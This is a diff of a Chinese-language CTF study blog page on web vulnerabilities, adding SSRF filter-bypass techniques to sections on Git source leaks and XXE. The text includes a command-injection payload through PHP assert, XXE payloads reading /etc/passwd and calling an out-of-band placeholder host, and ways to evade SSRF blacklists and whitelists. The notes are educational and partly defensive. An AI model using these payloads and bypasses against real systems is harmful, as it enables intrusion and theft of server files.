@@ -80,7 +80,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">3k</span>
+            <span class="post-count">3.7k</span>
         </span>
     </span>
 
@@ -89,7 +89,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">12 min</span>
+            <span class="post-count">14 min</span>
         </span>
     </span>
 </div>
@@ -185,7 +185,21 @@ PHP中的几个特殊的魔术方法：
 <h2 id="8、Git源码泄露"><a href="#8、Git源码泄露" class="headerlink" title="8、Git源码泄露  "></a><strong><font size=4>8、Git源码泄露</font></strong>  </h2><p>.git文件是开发人员在开发过程中使用 Git(分布式版本控制系统)做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息。开发人员使用 git 进行版本控制，对站点自动部署。但如果配置不当，可能会将 .git 文件夹直接部署到线上环境，这就引起了 git 泄露漏洞，我们可以通过 .git文件恢复网站源码，来获取一些敏感信息。<br>例题：<br><img src="/pic/git/git1.png"><br>猜测存在Git源码泄露,访问&#x2F;.git确实存在泄露<br><img src="/pic/git/git2.png"><br>利用Githacker获取源码<code>python GitHack.py http://61.147.171.105:52864/.git/</code><br><img src="/pic/git/git3.png"><br>在flag.php中未发现flag，在index.php发现漏洞assert函数为对字符串进行过滤处理<br><img src="/pic/git/git4.png"><br>通过传入参数<code>？page=123’) or system( “cat templates/flag.php”）</code>；&#x2F;&#x2F;来拼接语句使得可以查看flag文件。（其实这里的前半段可以是它存在的文件也可以是它不存在的文件（123就算换成flag也不影响）因为我们前半段返回的是false，我们只要or后面的执行即可。在最后添加注释&#x2F;&#x2F;，确保后面的代码不会执行）。<br><img src="/pic/git/git5.png">  </p>
 <h2 id="9、XXE"><a href="#9、XXE" class="headerlink" title="9、XXE  "></a><strong><font size=4>9、XXE</font></strong>  </h2><p>xxe:XML external entity injection,XML外部实体注入,允许攻击者干扰应用程序对 XML 数据的处理。当允许用户处理XML数据但是未过滤时会产生此漏洞。xxe的特征：URL后缀为.ashx&#x2F;数据包中包含xml信息。<br>类别：<br>1、有回显的：在注入之后会回显信息到页面进行显示，注入payload：<br><code>&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt; &lt;!ENTITY sp SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;root&gt;&lt;name&gt;&amp;sp;&lt;/name&gt;&lt;password&gt;1234&lt;/password&gt;&lt;/root&gt;     &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;!DOCTYPE r [ &lt;!ELEMENT r ANY &gt; &lt;!ENTITY sp SYSTEM &quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;&gt; ]&gt; &lt;root&gt;&lt;name&gt;&amp;sp;&lt;/name&gt;&lt;password&gt;1234&lt;/password&gt;&lt;/root&gt;</code></p>
 <p>2、无回显的：构造注入使得靶机访问自己的电脑文件，然后执行自己电脑文件中的命令，其中的命令就是回显内容。payload：<br><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITYcontent SYSTEM &quot; http://&lt;oursite&gt;/hhhhhhh&quot;&gt;]&gt;&lt;name&gt;&amp;content;&lt;/name&gt; </code>  </p>
-<h2 id="10、SSRF"><a href="#10、SSRF" class="headerlink" title="10、SSRF  "></a><strong><font size=4>10、SSRF</font></strong>  </h2><p>SSRF:服务器端请求伪造，攻击目标是从外网无法访问的目标，由于内网的一台服务器可以请求被攻击服务器的资源，则攻击者可利用此服务器进行攻击。通常利用伪协议获取flag(file、dict、gopher等)<br>例如：在一道ctf题目中通过抓包发现在&#x2F;request路径下通过service传值了<a href="http://www.asdddass.com，猜测存在SSRF漏洞，通过file命令读取文件：`file:///flag.txt`">www.asdddass.com，猜测存在SSRF漏洞，通过file命令读取文件：`file:///flag.txt`</a></p>
+<h2 id="10、SSRF"><a href="#10、SSRF" class="headerlink" title="10、SSRF  "></a><strong><font size=4>10、SSRF</font></strong>  </h2><p>SSRF:服务器端请求伪造，攻击目标是从外网无法访问的目标，由于内网的一台服务器可以请求被攻击服务器的资源，则攻击者可利用此服务器进行攻击。通常利用伪协议获取flag(file、dict、gopher等)<br>例如：在一道ctf题目中通过抓包发现在&#x2F;request路径下通过service传值了<a href="http://www.asdddass.com，猜测存在SSRF漏洞，通过file命令读取文件：`file:///flag.txt=file://127.0.0.1/flag.txt/http://127.0.0.1/flag.php`">www.asdddass.com，猜测存在SSRF漏洞，通过file命令读取文件：`file:///flag.txt=file://127.0.0.1/flag.txt/http://127.0.0.1/flag.php`</a><br><font color=red>防御的基本原理</font><br>SSRF产生的原因为未对URL中引用的URL进行限制，使得攻击者能够利用这一漏洞使得引用的URL指向内网中的其它地址以获得本应该被拒绝外网访问的资源。因此常见的SSRF防御手段为对引用的URL进行限制。常见的限制手段有黑名单和白名单两种。所谓的黑名单就是名单上的URL都不能引用，白名单就是只有名单上的URL才能引用。<br><font color=red>针对过滤的处理</font><br>1、基于黑名单的绕过<br>当127.0.0.1被过滤后，处理方式如下：  </p>
+<ul>
+<li>将其转换为其他进制：十进制：2130706433、十六进制：0x7F000001&#x2F;0x7F.0.0.1、八进制：0177.0.0.1</li>
+<li>省略模式（具有长度限制时）：127.0.0.1写为127.1或者0、0.0.0.0</li>
+<li>用CIDR绕过localhost：127.127.127.127</li>
+<li>注册域名使其解析为被过滤的目标IP：例如<a target="_blank" rel="noopener" href="http://www.aaa.com代表127.0.0.1,使用域名代替ip输入/">www.aaa.com代表127.0.0.1,使用域名代替IP输入</a></li>
+</ul>
+<p>2、当只有匹配到特定字符才解析时，可以利用<code>url=http://特定字符.@127.0.0.1/flag.php#show</code><br>3、基于白名单<br>在SSRF防御中，如果完全套用白名单的模式则会导致用户体验极差。以图片分享为例，如果某网站允许用户以URL的形式分享图片，则每一张图片最后的URL标识部分必定是不相同的。如果过滤器完全套用白名单的模式，则这项图片分享功能将会形同虚设。因此在基于白名单的SSRF过滤器中，采用的是<br><font color=red>只允许URL的前值为白名单中的内容</font>，但是如果URL解析器不支持嵌入式URL凭据，则很难奏效。  </p>
+<ul>
+<li>利用@嵌入URL，如<a target="_blank" rel="noopener" href="http://xxx/xx@http://yyy/yy(xxx%EF%BC%9A%E7%99%BD%E5%90%8D%E5%8D%95%E9%99%90%E5%88%B6%E7%9A%84%E5%89%8D%E5%80%BC)%EF%BC%9B">http://xxx/xx@http://yyy/yy(xxx：白名单限制的前值)；</a></li>
+<li>利用#嵌入UR，如<a target="_blank" rel="noopener" href="http://yyy/yy#http://xxx/xx(xxx%EF%BC%9A%E7%99%BD%E5%90%8D%E5%8D%95%E9%99%90%E5%88%B6%E5%89%8D%E5%80%BC)%EF%BC%9B">http://yyy/yy#http://xxx/xx(xxx：白名单限制前值)；</a></li>
+<li>注册域名，如<a target="_blank" rel="noopener" href="http://xxx.yyy/">http://xxx.yyy</a>;</li>
+<li>使用URL编码字符干扰URL解析；</li>
+</ul>
+<p>4、利用重定向漏洞对SSRF过滤器进行绕过<br>path后的URL用户可控，则可以将其指向内网IP：<code>?path=http://192.168.0.x:8080/admin</code>，其中内网IP为各种查询手段和信息收集获取到的IP。<br><font color=red>HINT：参数关键字（url字样大概率SSRF，file字样大概率文件包含)</font></p>
  
       <!-- reward -->
       
